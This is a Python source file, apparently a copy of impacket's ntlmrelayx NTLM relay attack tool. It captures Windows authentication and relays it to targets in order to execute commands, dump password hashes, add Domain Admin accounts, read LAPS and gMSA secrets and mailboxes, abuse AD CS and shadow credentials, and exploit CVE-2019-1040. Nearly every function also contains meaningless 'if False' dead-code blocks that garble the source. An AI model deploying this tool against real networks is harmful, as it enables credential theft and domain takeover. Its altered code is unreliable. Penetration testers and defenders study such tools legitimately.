import argparse
import sys
import logging
import cmd
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request
import json
from time import sleep
from threading import Thread
from impacket import version
from impacket.examples import logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig, parse_listening_ports
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
RELAY_SERVERS = []

class MiniShell(cmd.Cmd):

    def __init__(self, relayConfig, threads):
        if False:
            return 10
        cmd.Cmd.__init__(self)
        self.prompt = 'ntlmrelayx> '
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        if False:
            print('Hello World!')
        colLen = []
        for (i, col) in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))
        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for (num, width) in enumerate(colLen)])
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        if False:
            for i in range(10):
                print('nop')
        pass

    def do_targets(self, line):
        if False:
            print('Hello World!')
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())
        return

    def do_finished_attacks(self, line):
        if False:
            print('Hello World!')
        for url in self.relayConfig.target.finishedAttacks:
            print(url.geturl())
        return

    def do_socks(self, line):
        if False:
            while True:
                i = 10
        'Filter are available :\n type : socks <filter> <value>\n filters : target, username, admin \n values : \n   - target : IP or FQDN\n   - username : domain/username\n   - admin : true or false \n        '
        headers = ['Protocol', 'Target', 'Username', 'AdminStatus', 'Port']
        url = 'http://localhost:9090/ntlmrelayx/api/v1.0/relays'
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error('ERROR: %s' % str(e))
        else:
            if len(items) > 0:
                if '=' in line and len(line.replace('socks', '').split('=')) == 2:
                    _filter = line.replace('socks', '').split('=')[0]
                    _value = line.replace('socks', '').split('=')[1]
                    if _filter == 'target':
                        _filter = 1
                    elif _filter == 'username':
                        _filter = 2
                    elif _filter == 'admin':
                        _filter = 3
                    else:
                        logging.info('Expect : target / username / admin = value')
                    _items = []
                    for i in items:
                        if _value.lower() in i[_filter].lower():
                            _items.append(i)
                    if len(_items) > 0:
                        self.printTable(_items, header=headers)
                    else:
                        logging.info('No relay matching filter available!')
                elif '=' in line:
                    logging.info('Expect target/username/admin = value')
                else:
                    self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_startservers(self, line):
        if False:
            return 10
        if not self.serversRunning:
            start_servers(options, self.relayThreads)
            self.serversRunning = True
            logging.info('Relay servers started')
        else:
            logging.error('Relay servers are already running!')

    def do_stopservers(self, line):
        if False:
            print('Hello World!')
        if self.serversRunning:
            stop_servers(self.relayThreads)
            self.serversRunning = False
            logging.info('Relay servers stopped')
        else:
            logging.error('Relay servers are already stopped!')

    def do_exit(self, line):
        if False:
            while True:
                i = 10
        print('Shutting down, please wait!')
        return True

    def do_EOF(self, line):
        if False:
            return 10
        return self.do_exit(line)

def start_servers(options, threads):
    if False:
        while True:
            i = 10
    for server in RELAY_SERVERS:
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(options.socks, socksServer)
        c.setTargets(targetSystem)
        c.setExeFile(options.e)
        c.setCommand(options.c)
        c.setEnumLocalAdmins(options.enum_local_admins)
        c.setDisableMulti(options.no_multirelay)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(options.lootdir)
        c.setOutputFile(options.output_file)
        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record)
        c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port)
        c.setMSSQLOptions(options.query)
        c.setInteractive(options.interactive)
        c.setIMAPOptions(options.keyword, options.mailbox, options.all, options.imap_max)
        c.setIPv6(options.ipv6)
        c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
        c.setSMB2Support(options.smb2support)
        c.setSMBChallenge(options.ntlmchallenge)
        c.setInterfaceIp(options.interface_ip)
        c.setExploitOptions(options.remove_mic, options.remove_target)
        c.setWebDAVOptions(options.serve_image)
        c.setIsADCSAttack(options.adcs)
        c.setADCSOptions(options.template)
        c.setIsShadowCredentialsAttack(options.shadow_credentials)
        c.setShadowCredentialsOptions(options.shadow_target, options.pfx_password, options.export_type, options.cert_outfile_path)
        c.setAltName(options.altname)
        if server is HTTPRelayServer and options.r is not None:
            c.setMode('REDIRECT')
            c.setRedirectHost(options.r)
        if server is not SMBRelayServer and options.random:
            c.setRandomTargets(True)
        if server is HTTPRelayServer:
            c.setDomainAccount(options.machine_account, options.machine_hashes, options.domain)
            for port in options.http_port:
                c.setListeningPort(port)
                s = server(c)
                s.start()
                threads.add(s)
                sleep(0.1)
            continue
        elif server is SMBRelayServer:
            c.setListeningPort(options.smb_port)
        elif server is WCFRelayServer:
            c.setListeningPort(options.wcf_port)
        elif server is RAWRelayServer:
            c.setListeningPort(options.raw_port)
        s = server(c)
        s.start()
        threads.add(s)
    return c

def stop_servers(threads):
    if False:
        return 10
    todelete = []
    for thread in threads:
        if isinstance(thread, tuple(RELAY_SERVERS)):
            thread.server.shutdown()
            todelete.append(thread)
    for thread in todelete:
        threads.remove(thread)
        del thread
if __name__ == '__main__':
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help=False, description='For every connection received, this module will try to relay that connection to specified target(s) system or the original client')
    parser._optionals.title = 'Main options'
    parser.add_argument('-h', '--help', action='help', help='show this help message and exit')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t', '--target', action='store', metavar='TARGET', help="Target to relay the credentials to, can be an IP, hostname or URL like domain\\username@host:port (domain\\username and port are optional, and don't forget to escape the '\\'). If unspecified, it will relay back to the client')")
    parser.add_argument('-tf', action='store', metavar='TARGETSFILE', help='File that contains targets by hostname or full URL, one per line')
    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list automatically (only valid with -tf)')
    parser.add_argument('-i', '--interactive', action='store_true', help='Launch an smbclient, LDAP console or SQL shell insteadof executing a command after a successful relay. This console will listen locally on a  tcp port and can be reached with for example netcat.')
    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to bind SMB and HTTP servers', default='')
    serversoptions = parser.add_argument_group()
    serversoptions.add_argument('--no-smb-server', action='store_true', help='Disables the SMB server')
    serversoptions.add_argument('--no-http-server', action='store_true', help='Disables the HTTP server')
    serversoptions.add_argument('--no-wcf-server', action='store_true', help='Disables the WCF server')
    serversoptions.add_argument('--no-raw-server', action='store_true', help='Disables the RAW server')
    parser.add_argument('--smb-port', type=int, help='Port to listen on smb server', default=445)
    parser.add_argument('--http-port', help='Port(s) to listen on HTTP server. Can specify multiple ports by separating them with `,`, and ranges with `-`. Ex: `80,8000-8010`', default='80')
    parser.add_argument('--wcf-port', type=int, help='Port to listen on wcf server', default=9389)
    parser.add_argument('--raw-port', type=int, help='Port to listen on raw server', default=6666)
    parser.add_argument('--no-multirelay', action='store_true', required=False, help='If set, disable multi-host relay (SMB and HTTP servers)')
    parser.add_argument('-ra', '--random', action='store_true', help='Randomize target selection')
    parser.add_argument('-r', action='store', metavar='SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
    parser.add_argument('-l', '--lootdir', action='store', type=str, required=False, metavar='LOOTDIR', default='.', help='Loot directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
    parser.add_argument('-of', '--output-file', action='store', help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default "%s"). If errors are detected, run chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute ntlmrelayx.py again with -codec and the corresponding codec ' % sys.getdefaultencoding())
    parser.add_argument('-smb2support', action='store_true', default=False, help='SMB2 Support')
    parser.add_argument('-ntlmchallenge', action='store', default=None, help='Specifies the NTLM server challenge used by the SMB Server (16 hex bytes long. eg: 1122334455667788)')
    parser.add_argument('-socks', action='store_true', default=False, help='Launch a SOCKS proxy for the connection relayed')
    parser.add_argument('-wh', '--wpad-host', action='store', help='Enable serving a WPAD file for Proxy Authentication attack, setting the proxy host to the one supplied.')
    parser.add_argument('-wa', '--wpad-auth-num', action='store', type=int, default=1, help='Prompt for authentication N times for clients without MS16-077 installed before serving a WPAD file. (default=1)')
    parser.add_argument('-6', '--ipv6', action='store_true', help='Listen on both IPv6 and IPv4')
    parser.add_argument('--remove-mic', action='store_true', help='Remove MIC (exploit CVE-2019-1040)')
    parser.add_argument('--serve-image', action='store', help='local path of the image that will we returned to clients')
    parser.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND', help='Command to execute on target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be in the same directory). For RPC no output will be provided.')
    smboptions = parser.add_argument_group('SMB client options')
    smboptions.add_argument('-e', action='store', required=False, metavar='FILE', help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
    smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')
    rpcoptions = parser.add_argument_group('RPC client options')
    rpcoptions.add_argument('-rpc-mode', choices=['TSCH'], default='TSCH', help='Protocol to attack, only TSCH supported')
    rpcoptions.add_argument('-rpc-use-smb', action='store_true', required=False, help='Relay DCE/RPC to SMB pipes')
    rpcoptions.add_argument('-auth-smb', action='store', required=False, default='', metavar='[domain/]username[:password]', help='Use this credential to authenticate to SMB (low-privilege account)')
    rpcoptions.add_argument('-hashes-smb', action='store', required=False, metavar='LMHASH:NTHASH')
    rpcoptions.add_argument('-rpc-smb-port', type=int, choices=[139, 445], default=445, help='Destination port to connect to SMB')
    mssqloptions = parser.add_argument_group('MSSQL client options')
    mssqloptions.add_argument('-q', '--query', action='append', required=False, metavar='QUERY', help='MSSQL query to execute(can specify multiple)')
    httpoptions = parser.add_argument_group('HTTP options')
    httpoptions.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
    httpoptions.add_argument('-machine-hashes', action='store', metavar='LMHASH:NTHASH', help='Domain machine hashes, format is LMHASH:NTHASH')
    httpoptions.add_argument('-domain', action='store', help='Domain FQDN or IP to connect using NETLOGON')
    httpoptions.add_argument('-remove-target', action='store_true', default=False, help='Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)')
    ldapoptions = parser.add_argument_group('LDAP client options')
    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
    ldapoptions.add_argument('--no-acl', action='store_false', required=False, help='Disable ACL attacks')
    ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
    ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
    ldapoptions.add_argument('--add-computer', action='store', metavar=('COMPUTERNAME', 'PASSWORD'), required=False, nargs='*', help='Attempt to add a new computer account')
    ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
    ldapoptions.add_argument('--sid', action='store_true', required=False, help='Use a SID to delegate access rather than an account name')
    ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
    ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
    ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')
    ldapoptions.add_argument('--add-dns-record', nargs=2, action='store', metavar=('NAME', 'IPADDR'), required=False, help='Add the <NAME> record to DNS via LDAP pointing to <IPADDR>')
    imapoptions = parser.add_argument_group('IMAP client options')
    imapoptions.add_argument('-k', '--keyword', action='store', metavar='KEYWORD', required=False, default='password', help='IMAP keyword to search for. If not specified, will search for mails containing "password"')
    imapoptions.add_argument('-m', '--mailbox', action='store', metavar='MAILBOX', required=False, default='INBOX', help='Mailbox name to dump. Default: INBOX')
    imapoptions.add_argument('-a', '--all', action='store_true', required=False, help='Instead of searching for keywords, dump all emails')
    imapoptions.add_argument('-im', '--imap-max', action='store', type=int, required=False, default=0, help='Max number of emails to dump (0 = unlimited, default: no limit)')
    adcsoptions = parser.add_argument_group('AD CS attack options')
    adcsoptions.add_argument('--adcs', action='store_true', required=False, help='Enable AD CS relay attack')
    adcsoptions.add_argument('--template', action='store', metavar='TEMPLATE', required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
    adcsoptions.add_argument('--altname', action='store', metavar='ALTNAME', required=False, help='Subject Alternative Name to use when performing ESC1 or ESC6 attacks.')
    shadowcredentials = parser.add_argument_group('Shadow Credentials attack options')
    shadowcredentials.add_argument('--shadow-credentials', action='store_true', required=False, help='Enable Shadow Credentials relay attack (msDS-KeyCredentialLink manipulation for PKINIT pre-authentication)')
    shadowcredentials.add_argument('--shadow-target', action='store', required=False, help='target account (user or computer$) to populate msDS-KeyCredentialLink from')
    shadowcredentials.add_argument('--pfx-password', action='store', required=False, help='password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)')
    shadowcredentials.add_argument('--export-type', action='store', required=False, choices=['PEM', 'PFX'], type=lambda choice: choice.upper(), default='PFX', help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
    shadowcredentials.add_argument('--cert-outfile-path', action='store', required=False, help='filename to store the generated self-signed PEM or PFX certificate and key')
    try:
        options = parser.parse_args()
    except Exception as e:
        logging.error(str(e))
        sys.exit(1)
    if options.rpc_use_smb and (not options.auth_smb):
        logging.error('Set -auth-smb to relay DCE/RPC to SMB pipes')
        sys.exit(1)
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
    if options.add_dns_record:
        dns_name = options.add_dns_record[0].lower()
        if dns_name == 'wpad' or dns_name == '*':
            logging.warning('You are asking to add a `wpad` or a wildcard DNS name. This can cause disruption in larger networks (using multiple DNS subdomains) or if workstations already use a proxy config.')
    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()
    if options.target is not None:
        logging.info('Running in relay mode to single host')
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
        if targetSystem.generalCandidates:
            options.no_multirelay = True
    elif options.tf is not None:
        logging.info('Running in relay mode to hosts in targetfile')
        targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
        mode = 'RELAY'
    else:
        logging.info('Running in reflection mode')
        targetSystem = None
        mode = 'REFLECTION'
    if not options.no_smb_server:
        RELAY_SERVERS.append(SMBRelayServer)
    if not options.no_http_server:
        RELAY_SERVERS.append(HTTPRelayServer)
        try:
            options.http_port = parse_listening_ports(options.http_port)
        except ValueError:
            logging.error('Incorrect specification of port range for HTTP server')
            sys.exit(1)
        if options.r is not None:
            logging.info('Running HTTP server in redirect mode')
    if not options.no_wcf_server:
        RELAY_SERVERS.append(WCFRelayServer)
    if not options.no_raw_server:
        RELAY_SERVERS.append(RAWRelayServer)
    if targetSystem is not None and options.w:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()
    threads = set()
    socksServer = None
    if options.socks is True:
        socksServer = SOCKS()
        socksServer.daemon_threads = True
        socks_thread = Thread(target=socksServer.serve_forever)
        socks_thread.daemon = True
        socks_thread.start()
        threads.add(socks_thread)
    c = start_servers(options, threads)
    print('')
    logging.info('Servers started, waiting for connections')
    try:
        if options.socks:
            shell = MiniShell(c, threads)
            shell.cmdloop()
        else:
            sys.stdin.read()
    except KeyboardInterrupt:
        pass
    else:
        pass
    if options.socks is True:
        socksServer.shutdown()
        del socksServer
    for s in threads:
        del s
    sys.exit(0)